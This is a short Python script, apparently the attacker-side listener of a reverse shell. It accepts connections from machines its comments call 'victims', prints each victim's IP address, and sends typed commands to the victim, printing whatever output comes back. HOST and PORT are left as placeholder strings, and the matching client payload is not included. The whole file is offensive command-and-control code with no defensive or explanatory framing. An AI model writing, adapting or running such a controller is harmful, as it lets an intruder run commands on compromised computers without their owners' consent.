import socket


def listenNewConnection():
    # Accept any new connections
    socks, client = s.accept()
    # Display the address IP of the new victim
    print("[+] New victim successfully connected")
    print('[+] Victim IP : {}'.format(client[0]))
    # Start a loop to send command to the victim
    return socks


HOST = "HOST"
PORT = "PORT"
BUFFER = 1024
# Create a socket for the connection
s = socket.socket()
# Bind the socket to a address
s.bind((HOST, PORT))
# Now listen a connection with the socket
s.listen(5)
# Now show the host and the port of running server
print("Server start running on {}:{}".format(HOST, PORT))
socks = listenNewConnection()

while True:
    commandToVictim = input("$>")
    if not commandToVictim.strip():
        continue
    else:
        socks.send(commandToVictim.encode())
        resultFromVictim = socks.recv(BUFFER).decode()
        print(resultFromVictim)
        # AND listen for a new connection !
        if(commandToVictim == "you-exit-now"):
            print('Client disconnected ! Server waiting for new connection...')
            socks = listenNewConnection()
